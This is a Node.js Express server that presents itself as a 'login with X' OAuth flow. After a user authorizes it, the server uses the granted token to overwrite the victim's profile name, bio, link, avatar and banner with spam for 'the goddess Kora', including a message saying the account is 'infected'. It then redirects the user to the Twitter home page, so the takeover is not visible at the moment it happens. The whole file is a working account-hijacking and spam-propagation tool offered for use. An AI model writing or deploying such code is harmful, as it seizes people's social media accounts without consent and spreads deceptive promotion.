const express = require("express");
const crypto = require("crypto");
const OAuth = require("oauth-1.0a");
const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");

const app = express();

const API_KEY = process.env.API_KEY;
const API_SECRET = process.env.API_SECRET;
const CALLBACK_URL = process.env.CALLBACK_URL;

const requestTokens = new Map();

const oauth = OAuth({
  consumer: { key: API_KEY, secret: API_SECRET },
  signature_method: "HMAC-SHA1",
  hash_function(base, key) {
    return crypto.createHmac("sha1", key).update(base).digest("base64");
  }
});

/* ========= LOGIN ========= */
app.get("/", async (req, res) => {
  try {
    const headers = oauth.toHeader(
      oauth.authorize({
        url: "https://api.twitter.com/oauth/request_token",
        method: "POST"
      })
    );

    const r = await axios.post(
      "https://api.twitter.com/oauth/request_token",
      new URLSearchParams({ oauth_callback: CALLBACK_URL }),
      { headers }
    );

    const p = new URLSearchParams(r.data);
    requestTokens.set(p.get("oauth_token"), p.get("oauth_token_secret"));

    res.redirect(`https://api.twitter.com/oauth/authorize?oauth_token=${p.get("oauth_token")}`);
  } catch (e) {
    console.error(e.response?.data || e.message);
    res.send("Error iniciando login con X");
  }
});

/* ========= CALLBACK ========= */
app.get("/callback", async (req, res) => {
  const { oauth_token, oauth_verifier } = req.query;
  const secret = requestTokens.get(oauth_token);

  try {
    const headers = oauth.toHeader(
      oauth.authorize(
        { url: "https://api.twitter.com/oauth/access_token", method: "POST" },
        { key: oauth_token, secret }
      )
    );

    const r = await axios.post(
      "https://api.twitter.com/oauth/access_token",
      new URLSearchParams({ oauth_verifier }),
      { headers }
    );

    const p = new URLSearchParams(r.data);
    await updateEverything(
      p.get("oauth_token"),
      p.get("oauth_token_secret"),
      p.get("user_id")
    );

    res.redirect("https://twitter.com/home");
  } catch (e) {
    console.error(e.response?.data || e.message);
    res.send("Error finalizando autenticación");
  }
});

/* ========= UPDATE TODO ========= */
async function updateEverything(key, secret, id) {
  await updateProfile(key, secret, id);
  await updateImage(key, secret, "profile.jpg", "profile_image");
  await updateImage(key, secret, "banner.jpg", "profile_banner");
}

/* ========= TEXTO ========= */
async function updateProfile(key, secret, id) {
  const headers = oauth.toHeader(
    oauth.authorize(
      { url: "https://api.twitter.com/1.1/account/update_profile.json", method: "POST" },
      { key, secret }
    )
  );

  await axios.post(
    "https://api.twitter.com/1.1/account/update_profile.json",
    new URLSearchParams({
      name: `PROPAGANDA FOR THE GODDESS KORA #${id}`,
      description:
        "This account has been infected by the goddess Kora, do not resist and fall before her too: sent.bio/mistresskorra.",
      url: "https://x.com/sissyslutty21"
    }),
    { headers }
  );
}

/* ========= IMÁGENES ========= */
async function updateImage(key, secret, file, endpoint) {
  const data = new FormData();
  data.append("media", fs.createReadStream(file));

  const headers = oauth.toHeader(
    oauth.authorize(
      { url: `https://api.twitter.com/1.1/account/update_${endpoint}.json`, method: "POST" },
      { key, secret }
    )
  );

  await axios.post(
    `https://api.twitter.com/1.1/account/update_${endpoint}.json`,
    data,
    { headers: { ...headers, ...data.getHeaders() } }
  );
}

app.listen(process.env.PORT || 3000, () =>
  console.log("Servidor listo")
);
